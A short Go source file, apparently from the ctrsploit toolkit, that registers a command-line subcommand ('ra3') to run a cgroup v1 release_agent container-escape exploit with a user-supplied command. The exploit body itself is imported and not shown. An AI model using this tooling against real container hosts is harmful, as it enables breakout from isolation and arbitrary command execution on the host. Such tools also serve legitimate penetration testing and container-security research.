package exploit

import (
	cgroupv1_release_agent_unknown_rootfs "github.com/ctrsploit/ctrsploit/exploit/cgroupv1-release_agent-unknown_rootfs"
	"fmt"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/ssst0n3/awesome_libs/log"
	"github.com/urfave/cli/v2"
)

var cgroupv1ReleaseAgentUnkownRootfs = &cli.Command{
	Name:    cgroupv1_release_agent_unknown_rootfs.ExpName,
	Aliases: []string{"ra3"},
	Usage:   "escape tech by using the notify_on_release of cgroup v1 without known rootfs",
	Flags: []cli.Flag{
		&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true},
	},
	Action: func(context *cli.Context) error {
		cmd := context.String("cmd")
		log.Logger.Info(fmt.Sprintf("Execute command: %s", cmd))
		debug := context.Bool("debug")
		err := cgroupv1_release_agent_unknown_rootfs.InvokeExploit(cmd, debug)
		awesome_error.CheckFatal(err)
		return nil
	},
}
